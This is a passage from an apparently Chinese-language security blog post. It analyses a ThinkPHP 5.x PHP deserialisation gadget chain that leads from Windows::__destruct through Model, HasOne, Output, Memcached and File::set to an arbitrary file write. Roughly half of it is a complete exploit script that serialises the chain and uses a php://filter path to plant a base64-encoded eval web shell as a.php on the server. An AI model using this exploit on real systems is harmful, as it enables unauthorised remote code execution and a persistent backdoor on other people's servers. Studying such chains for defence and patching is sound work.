中发现`__destruct`中存在removeFiles函数，并且在其中存在`$this->files`和`file_exists`，那么我们通过可控的`$this->files`利用`file_exists`可以调用一些类的`__toString`方法，之后查看此方法在抽象类Model（thinkphp/library/think/Model.php），抽象类不能直接调用，因此需要找他的子类。我们可以找到Pivot（thinkphp/library/think/model/Pivot.php）进行调用
然后从toJson()->toArray()，我们看到`$item[$key] = $value ? $value->getAttr($attr) :
null`  
其中 **$value- >getAttr是我们利用__call魔术方法** 的点，我们来梳理代码逻辑使之可以顺利执行这句代码。
  * $this->append可以控制，将其变成Model类的getError方法，然后跟进看到此方法存在$this->error，因此可以控制$this->$relation()
  * 进入到 **getRelationData** 进行一次判断，首先需要进入的是Relation类型的对象，并且要符合这个关键判断`$this->parent && !$modelRelation->isSelfRelation() && get_class($modelRelation->getModel()) == get_class($this->parent)` 才能让$value变成我们想要的东西
    * 首先传入的Relation对象是由$this->$relation()控制，我们可以找到HasOne（thinkphp/library/think/model/relation/HasOne.php）这个类是继承抽象类OneToOne（thinkphp/library/think/model/relation/OnToOne.php），然后OneToOne又继承自Relation，所以HasOne有着Relation的血脉才能进入getRelationData方法
    * **$this- >parent** 是我们所要进入的__call魔术方法所在的类，这里我们选择的是Output类（thinkphp/library/think/console/Output）
    * **$modelRelation- >isSelfRelation()** 看到$this->selfRelation，我们可以控制。
    * **get_class($modelRelation- >getModel()) == get_class($this->parent))**，我们需要将最后Query的$this->model写成我们选择的Output类
  * 最后$this->parent赋值给$value，执行代码之后进入到Output类的__call方法
进入到__call，发现$this->styles我们可以控制那么就可以执行block方法，block调用writeln方法，writeln调用write方法，发现write方法中`$this->handle->write($messages,
$newline,
$type)`那么我们可以控制`$this->handle`，我们将其设置为Memcached类（thinkphp/library/think/session/driver/Mencached.php），然后进入到Memcached->write方法中看到Memcached也存在一个$this->handle，我们将其设置为File类（thinkphp/library/think/cache/driver/File.php）从而进入到File->set方法我们可以看到`file_put_contents($filename,
$data)`其中的两个参数我们都可以控制
  * 首先传入的三个参数已经确定，其中$name，$expire我们可以控制，但是有用的就是$name
  * 发现写入的数据就是我们无法控制的$value，无法利用。我们不慌继续往下看，看到有一个`$this->setTagItem($filename)`我们看到此方法又调用一次set方法并且传入set的三个值我们都可以控制
  * 再一次进入set方法， **通过php伪协议可以绕过exit()的限制** ，就可以将危害代码写在服务器上了。
### EXP
从网上找来的EXP，改了改关键的几个点，并且可以实现在Windows写文件
    files = [$files]; //$file => /think/Model的子类new Pivot(); Model是抽象类
            }
        }
    }
    namespace think {
        abstract class Model{
            protected $append = [];
            protected $error = null;
            public $parent;
            function __construct($output, $modelRelation)
            {
                $this->parent = $output;  //$this->parent=> think\console\Output;
                $this->append = array("xxx"=>"getError");     //调用getError 返回this->error
                $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类==>>HasOne
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
            function __construct($output, $modelRelation)
            {
                parent::__construct($output, $modelRelation);
            }
        }
    }
    namespace think\model\relation{
        class HasOne extends OneToOne {
        }
    }
    namespace think\model\relation {
        abstract class OneToOne
        {
            protected $selfRelation;
            protected $bindAttr = [];
            protected $query;
            function __construct($query)
            {
                $this->selfRelation = 0;
                $this->query = $query;    //$query指向Query
                $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
            }
        }
    }
    namespace think\db {
        class Query {
            protected $model;
            function __construct($model)
            {
                $this->model = $model; //$this->model=> think\console\Output;
            }
        }
    }
    namespace think\console{
        class Output{
            private $handle;
            protected $styles;
            function __construct($handle)
            {
                $this->styles = ['getAttr'];
                $this->handle =$handle; //$handle->think\session\driver\Memcached
            }
        }
    }
    namespace think\session\driver {
        class Memcached
        {
            protected $handler;
            function __construct($handle)
            {
                $this->handler = $handle; //$handle->think\cache\driver\File
            }
        }
    }
    namespace think\cache\driver {
        class File
        {
            protected $options=null;
            protected $tag;
            function __construct(){
                $this->options=[
                    'expire' => 3600, 
                    'cache_subdir' => false, 
                    'prefix' => '', 
                    'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php',
                    'data_compress' => false,
                ];
                $this->tag = 'xxx';
            }
        }
    }
    namespace {
        $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
        $Output = new think\console\Output($Memcached);
        $model = new think\db\Query($Output);
        $HasOne = new think\model\relation\HasOne($model);
        $window = new think\process\pipes\Windows(new think\model\Pivot($Output,$HasOne));
        echo serialize($window);
        echo base64_encode(serialize($window));
    }
### POC效果演示图
# 参考链接
  1. 
  2. 
  3. 
  4. 